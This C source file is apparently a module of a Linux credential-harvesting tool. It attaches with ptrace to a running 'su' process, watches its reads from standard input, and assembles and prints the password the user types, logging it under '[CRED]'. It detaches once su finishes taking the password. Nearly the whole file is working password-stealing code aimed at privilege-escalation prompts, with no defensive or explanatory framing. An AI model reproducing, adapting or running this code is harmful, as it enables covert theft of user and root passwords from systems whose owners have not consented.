#include <sys/ptrace.h>
#include <bits/types.h>
#include <sys/reg.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FILE_SUDO_TRACER 1
#include "config.h"
#include "helpers.h"
#include "tracers.h"

extern pid_t process_pid;
extern char *process_name;
extern char *process_path;
extern char *process_username;

// Check if data looks like password input (printable ASCII)
static int looks_like_password(const char *data, int len) {
  if (len < 1 || len > MAX_PASSWORD_LEN)
    return 0;
  
  // Count printable characters
  int printable = 0;
  for (int i = 0; i < len; i++) {
    unsigned char c = (unsigned char)data[i];
    if (c == '\n' || c == '\0') {
      // Reached end, check if we have enough printable chars
      return printable >= 3;  // At least 3 printable chars before newline
    }
    if (c >= 32 && c <= 126) {
      printable++;
    } else if (c != '\n' && c != '\0') {
      // Non-printable character in the middle
      return 0;  // Probably not password
    }
  }
  
  // If we got here without hitting newline, check printable count
  return printable >= 3;
}

void intercept_su(pid_t traced_process) {
  int status = 0;
  int syscall = 0;
  int fd = 0;
  int how = 0;
  int pwd_index = 0;  // Index for accumulating password characters
  long read_length = 0;
  long length = 0;
  char *read_string = NULL;
  char *password = NULL;
  struct user_regs_struct regs;

  password = (char *) calloc(sizeof(char) * MAX_PASSWORD_LEN + 1, 1);

  if (!password)
    goto exit_su;

  memset(&regs, 0, sizeof(regs));
  
  // Try to attach with retry logic
  int attach_attempts = 0;
  int max_attempts = 5;
  while (attach_attempts < max_attempts) {
    ptrace(PTRACE_ATTACH, traced_process, NULL, &regs);
    waitpid(traced_process, &status, 0);
    
    if (WIFSTOPPED(status)) {
      break;
    }
    
    attach_attempts++;
    if (attach_attempts < max_attempts) {
      usleep(50000);
    }
  }

  if (!WIFSTOPPED(status)) {
    debug("[SU] ptrace attach failed after %d attempts\n", attach_attempts);
    goto exit_su;
  }

  debug("[SU] ptrace attach succeeded\n");
  ptrace(PTRACE_SETOPTIONS, traced_process, 0, PTRACE_O_TRACESYSGOOD);

  while(1) {
    if (wait_for_syscall(traced_process) != 0)
      break;

    syscall = get_syscall(traced_process);

    // su calls rt_sigprocmask with SIG_SETMASK immediately after the
    // password is captured
    if (syscall == SYSCALL_rt_sigprocmask) {
      how = get_syscall_arg(traced_process, 0);
      if (how == SIG_SETMASK) {
        // Detach and allow process to continue
        ptrace(PTRACE_DETACH, traced_process, NULL, NULL);
        goto exit_su;
      }
    }

    if (wait_for_syscall(traced_process) != 0)
      break;

    if (syscall == SYSCALL_read) {
      fd = get_syscall_arg(traced_process, 0);
      read_length = get_syscall_arg(traced_process, 2);
      length = get_reg(traced_process, eax);

      debug("[SU] SYSCALL_read: fd=%d, read_length=%ld, returned=%ld\n", fd, read_length, length);

      // su reads password from stdin ONLY (fd=0)
      if (fd == 0 && length > 0 && length < 4096) {
        read_string = extract_read_string(traced_process, length);

        if (read_string) {
          // Handle single-character reads
          if (length == 1) {
            unsigned char c = (unsigned char)read_string[0];
            
            // Accumulate printable characters
            if (c >= 32 && c <= 126) {
              if (pwd_index < MAX_PASSWORD_LEN - 1) {
                password[pwd_index++] = c;
              }
            } else if (c == '\n' || c == '\0' || c == '\r') {
              // End of password input
              if (pwd_index > 0) {
                password[pwd_index] = '\0';
                debug("[CRED] Captured from fd=0 (accumulated len=%d): %s\n", pwd_index, password);
                output("%s\n", password);

                free(read_string);
                read_string = NULL;
                memset(password, 0, MAX_PASSWORD_LEN);
                pwd_index = 0;
              } else {
                free(read_string);
                read_string = NULL;
                memset(password, 0, MAX_PASSWORD_LEN);
                pwd_index = 0;
              }
            } else {
              free(read_string);
              read_string = NULL;
            }
          } else {
            // Multi-character read
            int j = 0;
            for (j = 0; j < length && j < MAX_PASSWORD_LEN; j++) {
              if (read_string[j] == '\n' || read_string[j] == '\0' || read_string[j] == '\r') {
                break;
              }
              password[j] = read_string[j];
            }

            if (j > 0) {
              password[j] = '\0';
              debug("[CRED] Captured from fd=0 (bulk len=%d): %s\n", j, password);
              output("%s\n", password);

              free(read_string);
              read_string = NULL;
              memset(password, 0, MAX_PASSWORD_LEN);
              pwd_index = 0;
            } else {
              free(read_string);
              read_string = NULL;
            }
          }
        }
      }
    }
  }

exit_su:
  free(password);
  free_process_name();
  free_process_username();
  free_process_path();
  exit(0);
}
